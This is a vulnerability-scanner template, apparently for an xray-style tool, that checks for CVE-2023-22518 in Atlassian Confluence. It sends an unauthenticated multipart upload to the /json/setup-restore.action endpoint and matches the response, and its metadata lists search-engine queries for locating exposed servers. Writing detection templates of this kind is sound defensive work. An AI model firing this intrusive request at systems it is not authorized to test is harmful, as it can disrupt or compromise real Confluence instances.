id: CVE-2023-22518

info:
  name: Atlassian Confluence Server - Improper Authorization
  author: iamnoooob,rootxharsh,pdresearch
  severity: critical
  verified: false
  description: |-
    All versions of Confluence Data Center and Server are affected by this unexploited vulnerability. There is no impact to confidentiality as an attacker cannot exfiltrate any instance data.
    Atlassian Cloud sites are not affected by this vulnerability. If your Confluence site is accessed via an atlassian.net domain, it is hosted by Atlassian and is not vulnerable to this issue.
    fofa: app="ATLASSIAN-Confluence"
    zoomeye: app:"Atlassian Confluence"
    censys: app:"Atlassian Confluence"
    hunter: app.name="Confluence"
  reference:
    - https://confluence.atlassian.com/pages/viewpage.action?pageId=1311473907
    - https://blog.projectdiscovery.io/atlassian-confluence-auth-bypass/
    - https://jira.atlassian.com/browse/CONFSERVER-93142
    - https://nvd.nist.gov/vuln/detail/CVE-2023-22518
    - https://github.com/RootUp/PersonalStuff/blob/master/check_cve_2023_22518.py
  tags: cve,cve2023,atlassian,confluence,rce,unauth,intrusive,kev
  created: 2023/11/21

set:
  randstr: randomLowercase(10)
  rboundary: randomLowercase(8)
rules:
  r0:
    request:
      method: POST
      path: /json/setup-restore.action
      headers:
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
      body: "\
        ------WebKitFormBoundary{{rboundary}}\r\n\
        Content-Disposition: form-data; name=\"buildIndex\"\r\n\
        \r\n\
        false\r\n\
        ------WebKitFormBoundary{{rboundary}}\r\n\
        \r\n\
        Content-Disposition: form-data; name=\"file\";filename=\"{{randstr}}.zip\"\r\n\
        \r\n\
        {{randstr}}
        ------WebKitFormBoundary{{rboundary}}\r\n\
        Content-Disposition: form-data; name=\"edit\"\r\n\
        \r\n\
        Upload and import\r\n\
        ------WebKitFormBoundary{{rboundary}}--\r\n\
        "
    expression: response.status == 200  && response.body.bcontains(b'The zip file did not contain an entry')  && response.body.bcontains(b'exportDescriptor.properties')
expression: r0()
